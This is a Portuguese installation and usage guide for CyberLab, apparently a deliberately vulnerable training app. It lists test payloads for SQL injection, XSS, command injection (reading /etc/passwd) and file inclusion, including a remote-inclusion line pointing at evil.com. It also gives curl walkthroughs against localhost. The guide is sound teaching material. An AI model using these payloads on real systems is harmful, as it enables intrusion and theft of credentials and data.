# 🚀 CyberLab Professional - Guia Completo de Instalação e Uso

> **⚠️ ATENÇÃO**: Esta aplicação contém vulnerabilidades INTENCIONAIS para fins educacionais. Use apenas em ambientes isolados e controlados.

## 📋 **ÍNDICE**
1. [Pré-requisitos](#-pré-requisitos)
2. [Instalação via Docker (Recomendado)](#-instalação-via-docker-recomendado)
3. [Instalação Manual](#-instalação-manual)
4. [Como Usar a Aplicação](#-como-usar-a-aplicação)
5. [Módulos Vulneráveis](#-módulos-vulneráveis)
6. [Troubleshooting](#-troubleshooting)

---

## 🔧 **PRÉ-REQUISITOS**

### **Requisitos Mínimos:**
- **Docker** 20.10+ e **Docker Compose** 2.0+ (Recomendado)
- **OU** Node.js 18+ e npm 8+ (Instalação manual)
- **Sistema Operacional**: Linux, macOS, ou Windows 10/11
- **RAM**: Mínimo 4GB (Recomendado 8GB)
- **Armazenamento**: 2GB livres

### **Instalação do Docker:**

#### **Ubuntu/Debian:**
```bash
# Atualizar sistema
sudo apt update && sudo apt upgrade -y

# Instalar Docker
curl -fsSL https://get.docker.com -o get-docker.sh
sudo sh get-docker.sh

# Instalar Docker Compose
sudo curl -L "https://github.com/docker/compose/releases/latest/download/docker-compose-$(uname -s)-$(uname -m)" -o /usr/local/bin/docker-compose
sudo chmod +x /usr/local/bin/docker-compose

# Adicionar usuário ao grupo docker
sudo usermod -aG docker $USER
newgrp docker
```

#### **Windows/macOS:**
- Baixe e instale **Docker Desktop** do site oficial: https://www.docker.com/products/docker-desktop

---

## 🐳 **INSTALAÇÃO VIA DOCKER (RECOMENDADO)**

### **Passo 1: Clonar o Repositório**
```bash
# Clonar o repositório
git clone https://github.com/dionebr/cyberlab.git
cd cyberlab
```

### **Passo 2: Configurar Ambiente**
```bash
# Verificar se o Docker está funcionando
docker --version
docker-compose --version

# Criar network isolada (opcional, para mais segurança)
docker network create cyberlab-network
```

### **Passo 3: Iniciar com Docker Compose**
```bash
# Construir e iniciar todos os serviços
docker-compose up -d --build

# Verificar se os serviços estão rodando
docker-compose ps

# Verificar logs
docker-compose logs -f
```

### **Passo 4: Verificar Instalação**
```bash
# Verificar saúde da aplicação (aguarde 1-2 minutos)
curl http://localhost:5001/api/status

# Verificar frontend
curl -I http://localhost:8080

# Ver logs em tempo real
docker-compose logs -f backend
```

### **Passo 5: Acessar a Aplicação**
- **🌐 Frontend**: http://localhost:8080
- **⚡ Backend API**: http://localhost:5001
- **📊 Analytics**: http://localhost:5001/api/analytics/dashboard
- **🔍 API Status**: http://localhost:5001/api/status

---

## ⚙️ **INSTALAÇÃO MANUAL**

### **Passo 1: Clonar e Preparar**
```bash
# Clonar o repositório
git clone https://github.com/dionebr/cyberlab.git
cd cyberlab

# Verificar versões
node --version  # deve ser 18+
npm --version   # deve ser 8+
```

### **Passo 2: Instalar Dependências**
```bash
# Instalar dependências do frontend
npm install

# Instalar dependências do backend
cd backend
npm install
cd ..
```

### **Passo 3: Configurar Backend**
```bash
cd backend

# Criar arquivo de environment
cp .env.example .env

# Editar configurações (opcional)
nano .env
```

### **Passo 4: Iniciar Aplicação**
```bash
# Terminal 1: Iniciar backend
cd backend
npm run dev
# Backend rodará em http://localhost:5001

# Terminal 2: Iniciar frontend (nova aba do terminal)
cd ..  # voltar para raiz do projeto
npm run dev
# Frontend rodará em http://localhost:8080
```

---

## 🎯 **COMO USAR A APLICAÇÃO**

### **Primeiro Acesso:**

1. **Abra o navegador** em `http://localhost:8080`
2. **Escolha o idioma** (Português, Inglês, Espanhol)
3. **Selecione o nível de segurança**: Easy, Medium, Hard
4. **Navegue pelos módulos** usando a sidebar lateral

### **Interface Principal:**

#### **📚 Learn Mode (Modo Aprendizado):**
- Acesse via menu lateral → "Learn"
- **Categorias disponíveis**:
  - Security Fundamentals
  - Web Security  
  - Network Security
  - Operating Systems Security
  - Secure Programming
- **Recursos**:
  - Lições estruturadas
  - Exercícios práticos
  - Sistema de progresso
  - Conteúdo em múltiplos idiomas

#### **🎯 Challenge Mode (Desafios Práticos):**
- Acesse via menu lateral → "Challenges"
- **12 módulos** de vulnerabilidade disponíveis
- **Níveis de dificuldade** ajustáveis
- **Feedback educacional** em tempo real

---

## 🔴 **MÓDULOS VULNERÁVEIS DISPONÍVEIS**

### **1. SQL Injection** 🗃️
**Endpoint**: `/api/vulnerable/users/search`

**Payloads para testar**:
```sql
-- Bypass básico
admin' OR '1'='1' --

-- Union attack
admin' UNION SELECT username,password,email,role FROM users --

-- Comentário MySQL
admin' OR 1=1#

-- Bypass com espaços
admin'/**/OR/**/'1'='1'/**/--
```

**Como usar**:
1. Acesse o módulo SQL Injection
2. Digite um payload no campo de busca
3. Observe os dados vazados
4. Analise a explicação educacional

### **2. Cross-Site Scripting (XSS)** 🕷️
**Endpoints**: 
- `/api/xss/reflected` (XSS Refletido)
- `/api/xss/comments` (XSS Armazenado)
- `/api/xss/dom` (XSS Baseado em DOM)

**Payloads para testar**:
```html
<!-- Básico -->
<script>alert('XSS')</script>

<!-- Event handlers -->
<img src=x onerror="alert('XSS')">

<!-- SVG -->
<svg onload="alert('XSS')">

<!-- Bypass de filtros -->
<ScRiPt>alert('XSS')</ScRiPt>
```

### **3. Command Injection** ⚡
**Endpoints**:
- `/api/cmd/ping` (Injeção básica)
- `/api/cmd/network-tools` (Ferramentas de rede)
- `/api/cmd/system-info` (Informações do sistema)

**Payloads para testar**:
```bash
# Separador de comandos
127.0.0.1; id

# Operador AND
127.0.0.1 && whoami

# Pipe
127.0.0.1 | cat /etc/passwd

# Background
127.0.0.1 & ps aux
```

### **4. File Upload** 📁
**Endpoint**: `/api/upload`

**Técnicas para testar**:
- Upload de arquivos `.php`, `.jsp`, `.aspx`
- Bypass de extensão: `shell.php.jpg`
- Path traversal: `../../../etc/passwd`
- Polyglot files (múltiplos formatos)

### **5. Authentication Bypass** 🔓
**Endpoints**: 
- `/api/auth/login`
- `/api/auth/admin`

**Técnicas**:
- SQL injection no login
- Manipulação de sessão
- Bypass de autorização
- Escalação de privilégios

### **6. Brute Force** 💥
**Endpoint**: `/api/auth/bruteforce`

**Características**:
- Tentativas ilimitadas (easy mode)
- Rate limiting básico (medium mode)  
- CAPTCHA e lockout (hard mode)
- Análise de timing

### **7. CSRF (Cross-Site Request Forgery)** 🎭
**Endpoints**:
- `/api/csrf/transfer` (Transferência de fundos)
- `/api/csrf/profile` (Alteração de perfil)

**Técnicas**:
- Bypass de token CSRF
- SameSite cookie exploitation
- Ataques baseados em referrer

### **8. File Inclusion** 📄
**Endpoints**:
- `/api/file/lfi` (Local File Inclusion)
- `/api/file/rfi` (Remote File Inclusion)

**Payloads**:
```bash
# LFI
../../../etc/passwd
....//....//....//etc/passwd

# RFI  
http://evil.com/shell.php
data://text/plain,<?php phpinfo();?>
```

### **9. Session Management** 🔐
**Endpoints**:
- `/api/session/create`
- `/api/session/validate`

**Vulnerabilidades**:
- Session ID predicável
- Session fixation
- Falta de rotação de sessão
- Cookies inseguros

### **10. Blind SQL Injection** 🕵️
**Endpoint**: `/api/blind/search`

**Técnicas**:
- Boolean-based blind injection
- Time-based blind injection
- Error-based information extraction

### **11. Insecure Captcha** 🤖
**Endpoints**:
- `/api/captcha/generate`
- `/api/captcha/verify`

**Vulnerabilidades**:
- Geração previsível
- Validação client-side
- Bypass methods disponíveis
- Algoritmos fixos

---

## 📊 **MONITORAMENTO E ANALYTICS**

### **Dashboard de Ataques:**
```bash
# Acessar dashboard completo
curl http://localhost:5001/api/analytics/dashboard

# Ver ataques recentes
curl http://localhost:5001/api/analytics/attacks

# Reset das estatísticas (para testes)
curl -X DELETE http://localhost:5001/api/analytics/reset
```

### **Métricas Disponíveis:**
- **Total de tentativas** de ataque
- **Taxa de sucesso** por módulo
- **Estatísticas por dificuldade**
- **Timeline** de ataques
- **IPs mais ativos**
- **Módulos mais atacados**

### **Logs em Tempo Real:**
```bash
# Docker
docker-compose logs -f backend

# Manual
tail -f backend/logs/application.log
```

---

## 🔒 **CONFIGURAÇÕES DE SEGURANÇA**

### **Níveis de Dificuldade:**

#### **Easy (Fácil):**
- ❌ **Sem filtros** ou sanitização
- ❌ **Sem rate limiting**
- ❌ **Sem validação** de input
- ✅ **Feedback detalhado** sobre ataques
- ✅ **Vulnerabilidades óbvias**

#### **Medium (Médio):**
- ⚠️ **Filtros básicos** implementados
- ⚠️ **Algumas proteções** ativas
- ⚠️ **Validação superficial**
- ✅ **Bypass possível** com técnicas intermediárias
- ✅ **Dicas de bypass** fornecidas

#### **Hard (Difícil):**
- 🛡️ **Filtros avançados**
- 🛡️ **Múltiplas camadas** de proteção  
- 🛡️ **WAF básico** implementado
- ⚠️ **Bypass complexo** necessário
- ⚠️ **Técnicas avançadas** requeridas

### **Isolamento de Rede (CRÍTICO):**

⚠️ **NUNCA execute em redes de produção!**

#### **Docker (Recomendado):**
```bash
# Criar rede isolada
docker network create --driver bridge --subnet=172.20.0.0/16 cyberlab-isolated

# Executar com isolamento
docker-compose up -d --network cyberlab-isolated
```

#### **Firewall (Adicional):**
```bash
# Bloquear acesso externo (apenas localhost)
sudo ufw deny from any to any port 5001
sudo ufw allow from 127.0.0.1 to any port 5001
```

---

## 🛠️ **TROUBLESHOOTING**

### **Problemas Comuns:**

#### **1. Backend não inicia:**
```bash
# Verificar porta em uso
sudo netstat -tlnp | grep :5001

# Matar processo que usa a porta
sudo kill -9 $(lsof -t -i:5001)

# Reiniciar com Docker
docker-compose restart backend

# Ou manual
cd backend && npm run dev
```

#### **2. Frontend não carrega:**
```bash
# Verificar porta 8080
sudo netstat -tlnp | grep :8080

# Limpar cache do npm
npm run dev -- --force

# Ou rebuild
npm run build && npm run dev
```

#### **3. Containers Docker não iniciam:**
```bash
# Verificar logs
docker-compose logs backend
docker-compose logs frontend

# Restart completo
docker-compose down
docker-compose up -d --build

# Verificar espaço em disco
df -h
docker system df
```

#### **4. Erro de conexão na API:**
```bash
# Verificar se backend está rodando
curl http://localhost:5001/api/status

# Verificar logs de erro
docker-compose logs -f backend

# Verificar variáveis de ambiente
docker-compose exec backend env | grep NODE_ENV
```

### **Logs e Debug:**
```bash
# Habilitar logs detalhados
export DEBUG=*
npm run dev

# Verificar saúde dos serviços
curl http://localhost:5001/api/status
curl http://localhost:8080

# Logs do Docker
docker-compose logs --tail=50 backend
```

### **Reset Completo:**
```bash
# Parar todos os serviços
docker-compose down -v

# Remover imagens e cache
docker system prune -af
docker volume prune -f

# Reconstruir tudo
docker-compose build --no-cache
docker-compose up -d

# Aguardar inicialização
sleep 60
curl http://localhost:5001/api/status
```

### **Performance:**
```bash
# Verificar uso de recursos
docker stats

# Limitar recursos (se necessário)
docker-compose up -d --memory="2g" --cpus="2.0"

# Verificar logs de erro de memória
dmesg | grep -i "out of memory"
```

---

## 📚 **RECURSOS EDUCACIONAIS AVANÇADOS**

### **Exemplos Práticos Detalhados:**

#### **SQL Injection Passo a Passo:**
```bash
# 1. Teste básico
curl "http://localhost:5001/api/vulnerable/users/search?username=admin"

# 2. Teste de injeção
curl "http://localhost:5001/api/vulnerable/users/search?username=admin'%20OR%20'1'='1'%20--"

# 3. Union attack
curl "http://localhost:5001/api/vulnerable/users/search?username=admin'%20UNION%20SELECT%20username,password,email,role%20FROM%20users%20--"

# 4. Análise do resultado
# Observe: dados sensíveis expostos, estrutura do banco revelada
```

#### **XSS Completo:**
```bash
# 1. XSS Refletido
curl "http://localhost:5001/api/xss/reflected?search=<script>alert('XSS')</script>"

# 2. XSS Armazenado (POST)
curl -X POST "http://localhost:5001/api/xss/comments/add" \
  -H "Content-Type: application/json" \
  -d '{"name":"Hacker","comment":"<script>alert(\"Stored XSS\")</script>"}'

# 3. Visualizar XSS armazenado
curl "http://localhost:5001/api/xss/comments"
```

#### **Command Injection Avançado:**
```bash
# 1. Injeção básica
curl -X POST "http://localhost:5001/api/cmd/ping" \
  -H "Content-Type: application/json" \
  -d '{"host":"127.0.0.1; id"}'

# 2. Enumeração do sistema
curl -X POST "http://localhost:5001/api/cmd/ping" \
  -H "Content-Type: application/json" \
  -d '{"host":"127.0.0.1; uname -a"}'

# 3. Listagem de arquivos
curl -X POST "http://localhost:5001/api/cmd/ping" \
  -H "Content-Type: application/json" \
  -d '{"host":"127.0.0.1; ls -la /"}'
```

### **Scripts de Automação:**

#### **Teste Automatizado:**
```bash
#!/bin/bash
# test-cyberlab.sh

echo "🧪 CyberLab Automated Testing"

# Verificar se serviços estão rodando
if ! curl -s http://localhost:5001/api/status > /dev/null; then
    echo "❌ Backend não está rodando"
    exit 1
fi

# Teste SQL Injection
echo "🔍 Testing SQL Injection..."
SQL_RESULT=$(curl -s "http://localhost:5001/api/vulnerable/users/search?username=admin'%20OR%20'1'='1'%20--")
if echo "$SQL_RESULT" | grep -q "admin"; then
    echo "✅ SQL Injection: VULNERÁVEL"
else
    echo "❌ SQL Injection: Falhou"
fi

# Teste XSS
echo "🕷️ Testing XSS..."
XSS_RESULT=$(curl -s "http://localhost:5001/api/xss/reflected?search=<script>alert('test')</script>")
if echo "$XSS_RESULT" | grep -q "<script>"; then
    echo "✅ XSS: VULNERÁVEL"
else
    echo "❌ XSS: Falhou"
fi

# Teste Command Injection
echo "⚡ Testing Command Injection..."
CMD_RESULT=$(curl -s -X POST "http://localhost:5001/api/cmd/ping" \
  -H "Content-Type: application/json" \
  -d '{"host":"127.0.0.1; id"}')
if echo "$CMD_RESULT" | grep -q "uid="; then
    echo "✅ Command Injection: VULNERÁVEL"
else
    echo "❌ Command Injection: Falhou"
fi

echo "🎯 Teste completo!"
```

---

## 🎓 **OBJETIVOS EDUCACIONAIS DETALHADOS**

### **Para Estudantes de Segurança:**
- **Compreender vulnerabilidades** na prática
- **Desenvolver pensamento** de atacante
- **Aprender técnicas** de exploitation
- **Entender impacto** de vulnerabilidades
- **Praticar** em ambiente seguro

### **Para Professores e Instrutores:**
- **Demonstrações práticas** em aula
- **Ambiente controlado** para ensino
- **Material estruturado** e progressivo
- **Analytics** para acompanhar progresso
- **Múltiplos idiomas** para turmas internacionais

### **Para Profissionais de Segurança:**
- **Treinamento corporativo** em vulnerabilidades
- **Desenvolvimento** de skills de pentest
- **Validação** de conhecimentos práticos
- **Preparação** para certificações
- **Research** em novas técnicas

### **Para Desenvolvedores:**
- **Entender** vulnerabilidades comuns
- **Aprender** a identificar falhas
- **Desenvolver** código mais seguro
- **Testar** aplicações próprias
- **Implementar** controles de segurança

---

## ⚖️ **AVISOS LEGAIS E RESPONSABILIDADES**

### **⚠️ USO RESPONSÁVEL OBRIGATÓRIO:**

#### **✅ Permitido:**
- ✅ **Uso educacional** em instituições de ensino
- ✅ **Pesquisa** em segurança cibernética  
- ✅ **Treinamento corporativo** autorizado
- ✅ **Preparação** para certificações
- ✅ **Desenvolvimento** de skills éticos

#### **🚫 Estritamente Proibido:**
- 🚫 **Teste em sistemas** de terceiros sem autorização
- 🚫 **Deployment** em ambiente de produção
- 🚫 **Ataques** contra infraestrutura real
- 🚫 **Atividades maliciosas** ou ilegais
- 🚫 **Violação** de termos de serviço

### **🚨 DISCLAIMERS IMPORTANTES:**

⚠️ **Esta aplicação é INTENCIONALMENTE VULNERÁVEL**
⚠️ **NÃO é adequada para uso em produção**
⚠️ **Use EXCLUSIVAMENTE em ambiente isolado**
⚠️ **Os autores NÃO se responsabilizam por uso inadequado**
⚠️ **Respeite as leis locais sobre segurança cibernética**

### **🛡️ RESPONSABILIDADES DO USUÁRIO:**
- **Manter** a aplicação em ambiente isolado
- **Não expor** à internet pública
- **Usar apenas** para fins educacionais
- **Respeitar** propriedade intelectual
- **Seguir** leis e regulamentos locais

---

## 🤝 **SUPORTE E COMUNIDADE**

### **📞 Canais de Suporte:**
- **🐛 Issues**: https://github.com/dionebr/cyberlab/issues
- **📖 Wiki**: https://github.com/dionebr/cyberlab/wiki
- **💬 Discussions**: https://github.com/dionebr/cyberlab/discussions

### **🔄 Como Contribuir:**
1. **Fork** o repositório
2. **Crie** uma branch para sua feature (`git checkout -b feature/nova-funcionalidade`)
3. **Commit** suas mudanças (`git commit -m 'Adiciona nova funcionalidade'`)
4. **Push** para a branch (`git push origin feature/nova-funcionalidade`)  
5. **Abra** um Pull Request

### **🏆 Tipos de Contribuição:**
- **🐛 Bug reports** e correções
- **✨ Novas vulnerabilidades** e módulos
- **📚 Documentação** e traduções
- **🎨 Melhorias** na UI/UX
- **⚡ Performance** e otimizações

---

## 🎯 **ROADMAP E PRÓXIMOS PASSOS**

### **🚀 Versão 2.1 (Planejada):**
- **API GraphQL** vulnerável
- **Mobile vulnerabilities**
- **IoT exploitation** módulos
- **Cloud security** challenges
- **AI/ML** security testing

### **🔮 Futuro (v3.0):**
- **Multi-tenant** environment
- **Real-time collaboration**
- **Advanced analytics**
- **Custom vulnerability** creation
- **Integration** com ferramentas de pentest

---

**🎯 CyberLab Professional v2.0 - A Plataforma Definitiva para Educação em Segurança Cibernética**

*"O conhecimento é poder, mas o conhecimento aplicado é transformação"* 🚀

---

<div align="center">

**⚡ Desenvolvido com paixão pela segurança cibernética ⚡**

[![Docker](https://img.shields.io/badge/Docker-Ready-2496ED?style=for-the-badge&logo=docker&logoColor=white)](https://www.docker.com/)
[![Node.js](https://img.shields.io/badge/Node.js-18+-339933?style=for-the-badge&logo=node.js&logoColor=white)](https://nodejs.org/)
[![React](https://img.shields.io/badge/React-18-61DAFB?style=for-the-badge&logo=react&logoColor=black)](https://reactjs.org/)
[![TypeScript](https://img.shields.io/badge/TypeScript-Ready-3178C6?style=for-the-badge&logo=typescript&logoColor=white)](https://www.typescriptlang.org/)

</div>